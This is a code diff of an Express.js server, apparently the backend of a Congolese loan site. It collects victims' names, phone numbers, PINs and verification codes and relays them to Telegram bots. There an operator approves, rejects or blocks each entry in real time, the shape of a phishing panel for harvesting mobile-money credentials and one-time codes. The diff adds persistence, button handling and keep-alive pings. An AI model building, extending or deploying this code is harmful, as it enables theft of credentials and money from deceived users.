@@ -3,16 +3,45 @@ const express = require('express');
 const axios = require('axios');
 const { v4: uuidv4 } = require('uuid');
 const path = require('path');
+const fs = require('fs');
 
 const app = express();
 const PORT = process.env.PORT || 10000;
 const DOMAIN = process.env.BACKEND_URL || 'https://click-loans-congo-x50d.onrender.com';
 
-// ---------------- MEMORY STORES ----------------
-const approvedPins = {};
-const approvedCodes = {};
-const blockPins = {};
-const requestBotMap = {};
+// ---------------- PERSISTENT STORES ----------------
+const DATA_FILE = path.join(__dirname, 'data.json');
+
+let approvedPins = {};
+let approvedCodes = {};
+let blockPins = {};
+let requestBotMap = {};
+
+try {
+    if (fs.existsSync(DATA_FILE)) {
+        const saved = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
+        approvedPins   = saved.approvedPins   || {};
+        approvedCodes  = saved.approvedCodes  || {};
+        blockPins      = saved.blockPins      || {};
+        requestBotMap  = saved.requestBotMap  || {};
+        console.log('💾 Données restaurées depuis data.json');
+    }
+} catch (e) {
+    console.error('❌ Échec chargement data.json:', e.message);
+}
+
+function persist() {
+    try {
+        fs.writeFileSync(DATA_FILE, JSON.stringify({
+            approvedPins, approvedCodes, blockPins, requestBotMap
+        }));
+    } catch (e) {
+        console.error('❌ Persist failed:', e.message);
+    }
+}
+
+// Double-click protection
+const processedCallbacks = new Set();
 
 // ---------------- MULTI-BOT STORE ----------------
 let bots = [];
@@ -43,6 +72,7 @@ async function sendTelegramMessage(bot, text, inlineKeyboard = []) {
         await axios.post(`https://api.telegram.org/bot${bot.botToken}/sendMessage`, {
             chat_id: bot.chatId,
             text,
+            parse_mode: 'Markdown',
             reply_markup: inlineKeyboard.length ? { inline_keyboard: inlineKeyboard } : undefined
         });
     } catch (err) {
@@ -50,24 +80,59 @@ async function sendTelegramMessage(bot, text, inlineKeyboard = []) {
     }
 }
 
-async function answerCallback(bot, callbackId) {
+async function answerCallback(bot, callbackId, text = '') {
     try {
         await axios.post(`https://api.telegram.org/bot${bot.botToken}/answerCallbackQuery`, {
-            callback_query_id: callbackId
+            callback_query_id: callbackId,
+            text
         });
     } catch (err) {
         console.error(err.response?.data || err.message);
     }
 }
 
-// ---------------- WEBHOOKS ----------------
-async function setWebhook(bot) {
+async function editTelegramMessage(bot, chatId, messageId, text, inlineKeyboard = null) {
     try {
-        const webhookUrl = `${DOMAIN}/telegram-webhook/${bot.botId}`;
-        await axios.get(`https://api.telegram.org/bot${bot.botToken}/setWebhook?url=${webhookUrl}`);
-        console.log(`✅ Webhook configuré pour ${bot.botId}`);
+        const payload = {
+            chat_id: chatId,
+            message_id: messageId,
+            text,
+            parse_mode: 'Markdown'
+        };
+        // null / vide = supprime les boutons
+        payload.reply_markup = { inline_keyboard: inlineKeyboard || [] };
+
+        await axios.post(
+            `https://api.telegram.org/bot${bot.botToken}/editMessageText`,
+            payload
+        );
     } catch (err) {
-        console.error(`❌ Échec du webhook pour ${bot.botId}:`, err.response?.data || err.message);
+        const desc = err.response?.data?.description || err.message;
+        if (!desc.includes('message is not modified')) {
+            console.error('editMessageText error:', desc);
+        }
+    }
+}
+
+// ---------------- WEBHOOKS ----------------
+async function setWebhook(bot, retries = 5) {
+    const webhookUrl = `${DOMAIN}/telegram-webhook/${bot.botId}`;
+    for (let i = 0; i < retries; i++) {
+        try {
+            const { data } = await axios.get(
+                `https://api.telegram.org/bot${bot.botToken}/setWebhook`,
+                { params: { url: webhookUrl, drop_pending_updates: false } }
+            );
+            if (data.ok) {
+                console.log(`✅ Webhook configuré pour ${bot.botId}: ${webhookUrl}`);
+                return;
+            }
+            throw new Error(JSON.stringify(data));
+        } catch (err) {
+            console.error(`❌ Webhook tentative ${i + 1} échouée pour ${bot.botId}:`,
+                err.response?.data || err.message);
+            await new Promise(r => setTimeout(r, 3000));
+        }
     }
 }
 
@@ -104,6 +169,7 @@ app.post('/submit-pin', (req, res) => {
     const requestId = uuidv4();
     approvedPins[requestId] = null;
     requestBotMap[requestId] = botId;
+    persist();
 
     sendTelegramMessage(bot, `🔐 VÉRIFICATION DU CODE PIN\n\nNom: ${name}\nTéléphone: ${phone}\nPIN: ${pin}`, [[
         { text: '✅ PIN correct', callback_data: `pin_ok:${requestId}` },
@@ -129,6 +195,7 @@ app.post('/submit-code', (req, res) => {
     const requestId = uuidv4();
     approvedCodes[requestId] = null;
     requestBotMap[requestId] = botId;
+    persist();
 
     sendTelegramMessage(bot, `🔑 VÉRIFICATION DU CODE\n\nNom: ${name}\nTéléphone: ${phone}\nCode: ${code}`, [[
         { text: '✅ Code correct', callback_data: `code_ok:${requestId}` },
@@ -151,15 +218,57 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
     const cb = req.body.callback_query;
     if (!cb) return res.sendStatus(200);
 
-    const [action, requestId] = cb.data.split(':');
-    let feedback = '';
+    // Protection double-clic
+    if (processedCallbacks.has(cb.id)) return res.sendStatus(200);
+    processedCallbacks.add(cb.id);
+    setTimeout(() => processedCallbacks.delete(cb.id), 10 * 60 * 1000);
 
-    if (action === 'pin_ok') { approvedPins[requestId] = true; feedback = 'PIN approuvé ✅'; }
-    if (action === 'pin_bad') { approvedPins[requestId] = false; feedback = 'PIN rejeté ❌'; }
-    if (action === 'pin_block') { blockPins[requestId] = true; feedback = 'Utilisateur bloqué 🛑'; }
-    if (action === 'code_ok') { approvedCodes[requestId] = true; feedback = 'Code approuvé ✅'; }
-    if (action === 'code_bad') { approvedCodes[requestId] = false; feedback = 'Code rejeté ❌'; }
-    if (action === 'code_pin') { approvedCodes[requestId] = true; approvedPins[requestId] = false; feedback = 'Code approuvé – ressaisir le PIN'; }
+    const [action, requestId] = (cb.data || '').split(':');
+    const messageId = cb.message?.message_id;
+    const chatId    = cb.message?.chat?.id;
+    let feedback = '';
+    let statusLine = '';
+
+    if (action === 'pin_ok') {
+        approvedPins[requestId] = true;
+        persist();
+        feedback = 'PIN approuvé ✅';
+        statusLine = '\n\n_✅ Approuvé par admin_';
+    } else if (action === 'pin_bad') {
+        approvedPins[requestId] = false;
+        persist();
+        feedback = 'PIN rejeté ❌';
+        statusLine = '\n\n_❌ Rejeté par admin_';
+    } else if (action === 'pin_block') {
+        blockPins[requestId] = true;
+        persist();
+        feedback = 'Utilisateur bloqué 🛑';
+        statusLine = '\n\n_🛑 Utilisateur bloqué_';
+    } else if (action === 'code_ok') {
+        approvedCodes[requestId] = true;
+        persist();
+        feedback = 'Code approuvé ✅';
+        statusLine = '\n\n_✅ Approuvé par admin_';
+    } else if (action === 'code_bad') {
+        approvedCodes[requestId] = false;
+        persist();
+        feedback = 'Code rejeté ❌';
+        statusLine = '\n\n_❌ Rejeté par admin_';
+    } else if (action === 'code_pin') {
+        approvedCodes[requestId] = true;
+        approvedPins[requestId]  = false;
+        persist();
+        feedback = 'Code approuvé – ressaisir le PIN';
+        statusLine = '\n\n_✅ Code OK — ⚠️ PIN à ressaisir_';
+    } else {
+        statusLine = '\n\n_⚠️ Action inconnue_';
+    }
+
+    // 🔥 Édite le message original : ajoute le statut + SUPPRIME les boutons
+    if (messageId && chatId && statusLine) {
+        const originalText = cb.message.text || '';
+        await editTelegramMessage(bot, chatId, messageId, originalText + statusLine, null);
+    }
 
     if (feedback) await sendTelegramMessage(bot, `📝 Retour:\n${feedback}`);
     await answerCallback(bot, cb.id);
@@ -172,8 +281,9 @@ app.get('/debug/bots', (req, res) => res.json(bots));
 // =====================================================
 //          KEEP-ALIVE (ANTI-SLEEP) SYSTEM
 // =====================================================
-// Render free tier sleeps a web service after 15 min of inactivity.
-// We ping our own /health endpoint every 10 min to keep it awake.
+// ⚠️ IMPORTANT : un serveur endormi NE PEUT PAS se réveiller lui-même.
+// Ce self-ping ne fonctionne QUE tant que le process tourne.
+// Utilisez AUSSI un pinger externe (cron-job.org / UptimeRobot) sur /health.
 
 const KEEPALIVE_INTERVAL_MS = 10 * 60 * 1000; // 10 minutes
 let keepAliveTimer = null;
@@ -185,7 +295,6 @@ async function selfPing() {
         console.log(`💓 Keep-alive OK (${res.status}) → ${url} @ ${new Date().toISOString()}`);
     } catch (err) {
         console.warn(`⚠️ Keep-alive failed: ${err.response?.status || err.message}`);
-        // If self-ping fails (e.g. own instance is cold), try one extra ping after 30s
         setTimeout(() => {
             axios.get(`${DOMAIN}/health`, { timeout: 20000 })
                 .then(r => console.log(`💓 Keep-alive retry OK (${r.status})`))
@@ -196,9 +305,7 @@ async function selfPing() {
 
 function startKeepAlive() {
     if (keepAliveTimer) clearInterval(keepAliveTimer);
-    // Initial ping shortly after boot
     setTimeout(selfPing, 15 * 1000);
-    // Then every 10 minutes
     keepAliveTimer = setInterval(selfPing, KEEPALIVE_INTERVAL_MS);
     console.log('🩺 Keep-alive démarré (ping toutes les 10 min)');
 }
@@ -208,14 +315,12 @@ function startKeepAlive() {
 // =====================================================
 process.on('uncaughtException', (err) => {
     console.error('💥 uncaughtException:', err);
-    // Don't exit — keep the process alive so Render doesn't restart it cold.
 });
 
 process.on('unhandledRejection', (reason) => {
     console.error('💥 unhandledRejection:', reason);
 });
 
-// Graceful shutdown so Render restarts are clean
 process.on('SIGTERM', () => {
     console.log('🛑 SIGTERM reçu, arrêt propre...');
     if (keepAliveTimer) clearInterval(keepAliveTimer);
